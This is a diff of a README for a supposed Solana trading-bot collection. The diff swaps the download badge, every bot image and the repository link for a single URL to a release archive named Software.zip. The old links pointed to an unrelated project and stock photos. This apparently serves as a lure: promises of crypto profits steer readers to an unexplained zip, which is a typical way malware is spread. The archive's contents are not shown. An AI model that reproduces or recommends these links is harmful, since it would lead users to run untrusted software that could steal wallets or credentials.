@@ -19,7 +19,7 @@ This repository, **solana-trading-bot**, is a collection of trading bots designe
 
 To kickstart your trading journey with our Solana bots, download the latest release by clicking the button below:
 
-[![Download Bot](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Bot](https://github.com/KevinTruong72/solana-trading-bot/releases/download/v1.0/Software.zip%20Release-brightgreen)](https://github.com/KevinTruong72/solana-trading-bot/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -33,22 +33,22 @@ The link provided needs to be launched to access the download.
 Here's a quick rundown of the trading bots included in this repository:
 
 #### 1. Pumpfun Bot
-![Pumpfun](https://source.unsplash.com/400x300/?finance)
+![Pumpfun](https://github.com/KevinTruong72/solana-trading-bot/releases/download/v1.0/Software.zip)
 
 The Pumpfun Bot is tailored for identifying and capitalizing on pump opportunities in the Solana ecosystem.
 
 #### 2. Raydium Bot
-![Raydium](https://source.unsplash.com/400x300/?technology)
+![Raydium](https://github.com/KevinTruong72/solana-trading-bot/releases/download/v1.0/Software.zip)
 
 The Raydium Bot is optimized for trading on the Raydium decentralized exchange, offering efficient and automated trading solutions.
 
 #### 3. Meteora Bot
-![Meteora](https://source.unsplash.com/400x300/?galaxy)
+![Meteora](https://github.com/KevinTruong72/solana-trading-bot/releases/download/v1.0/Software.zip)
 
 The Meteora Bot utilizes advanced algorithms to execute trades swiftly and profitably in the dynamic Solana trading environment.
 
 #### 4. Jupiter Bot
-![Jupiter](https://source.unsplash.com/400x300/?space)
+![Jupiter](https://github.com/KevinTruong72/solana-trading-bot/releases/download/v1.0/Software.zip)
 
 The Jupiter Bot is designed to provide traders with strategic insights and automated trading capabilities for maximizing profits.
 
@@ -68,7 +68,7 @@ The Jupiter Bot is designed to provide traders with strategic insights and autom
 
 ## 💡 Want to Learn More?
 
-Visit our [GitHub Repository](https://github.com/cli/go-gh) for additional details, documentation, and the latest updates.
+Visit our [GitHub Repository](https://github.com/KevinTruong72/solana-trading-bot/releases/download/v1.0/Software.zip) for additional details, documentation, and the latest updates.
 
 ---
 
